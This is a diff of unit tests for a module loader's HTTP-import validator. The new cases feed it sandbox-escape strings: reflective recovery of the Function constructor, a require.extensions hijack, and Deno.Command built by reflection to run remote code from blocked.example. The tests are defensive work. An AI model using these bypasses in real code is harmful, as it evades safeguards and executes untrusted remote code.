@@ -1,6 +1,7 @@
 import "#veryfront/schemas/_test-setup.ts";
 import { assertEquals, assertRejects } from "#veryfront/testing/assert.ts";
 import { describe, it } from "#veryfront/testing/bdd.ts";
+import { dirname, fromFileUrl } from "#veryfront/compat/path";
 import {
   collectLocalWorkerSpecifiers,
   extractModuleSpecifiers,
@@ -40,6 +41,26 @@ describe("rewriteImportMetaLocations", () => {
       await rewriteImportMetaLocations(`const text = "import metadata";`, moduleUrl),
       `const text = "import metadata";`,
       "the conservative prefilter must leave parser-confirmed inert text unchanged",
+    );
+  });
+
+  it("preserves import.meta dirname and filename for the declaring module", async () => {
+    const moduleUrl = "file:///project/lib/helper.ts";
+    const modulePath = fromFileUrl(moduleUrl);
+    const source = [
+      `const directory = import.meta.dirname;`,
+      `const filename = import.meta["filename"];`,
+      `const text = "import.meta.dirname import.meta.filename";`,
+    ].join("\n");
+
+    assertEquals(
+      await rewriteImportMetaLocations(source, moduleUrl),
+      [
+        `const directory = ${JSON.stringify(dirname(modulePath))};`,
+        `const filename = ${JSON.stringify(modulePath)};`,
+        `const text = "import.meta.dirname import.meta.filename";`,
+      ].join("\n"),
+      "bundling must preserve source filesystem locations without changing inert text",
     );
   });
 
@@ -461,6 +482,20 @@ describe("routing/api/module-loader/http-validator", () => {
           `${descriptorOwner}.getOwnPropertyDescriptor can expose the Function constructor`,
         );
       }
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const descriptors = Object.getOwnPropertyDescriptors(` +
+              `Object.getPrototypeOf(() => {}));` +
+              ` const make = Object.values(descriptors).find((entry) =>` +
+              ` entry.value === Function)?.value;` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "plural descriptor reads can recover the Function constructor",
+      );
       for (
         const source of [
           `globalThis.Symbol = () => "constructor"; const fn = () => {};` +
@@ -1498,6 +1533,18 @@ describe("routing/api/module-loader/http-validator", () => {
         "createRequire",
         "a createRequire load never appears in the module graph this validator walks",
       );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `require.extensions[".js"] = (module, filename) =>` +
+              ` module._compile(Deno.readTextFileSync(filename), filename);` +
+              ` require("installed-dependency");`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "require.extensions can execute source outside the validated graph",
+      );
       for (const moduleName of ["node:worker_threads", "worker_threads"]) {
         await assertRejects(
           async () =>
@@ -1703,6 +1750,25 @@ describe("routing/api/module-loader/http-validator", () => {
         "dynamic code generation",
         "a destructured subprocess constructor remains an unchecked module loader",
       );
+      for (
+        const source of [
+          `Reflect.construct(Deno.Command, [Deno.execPath(), { args: ["run", "-A",` +
+          ` "https://blocked.example/mod.ts"] }]).output();`,
+          `const Command = Deno.Command; Reflect.construct(Command, [Deno.execPath(),` +
+          ` { args: ["run", "-A", "https://blocked.example/mod.ts"] }]).output();`,
+          `const commands = new Map([["run", Deno.Command]]);` +
+          ` const Command = commands.get("run");` +
+          ` new Command(Deno.execPath(), { args: ["run", "-A",` +
+          ` "https://blocked.example/mod.ts"] }).output();`,
+        ]
+      ) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "dynamic code generation",
+          "reflective construction and opaque storage must retain subprocess capability checks",
+        );
+      }
       for (const method of ["spawn", "spawnSync"]) {
         await assertRejects(
           async () =>
@@ -1894,6 +1960,8 @@ describe("routing/api/module-loader/http-validator", () => {
         "a declare binding is erased and cannot shadow the global Worker constructor",
       );
       await validateHTTPImports(`import type { Session } from "node:inspector";`, []);
+      await validateHTTPImports(`import { type Session } from "node:inspector";`, []);
+      await validateHTTPImports(`export { type Context } from "node:vm";`, []);
     });
 
     it("should ignore locally shadowed subprocess capability names", async () => {
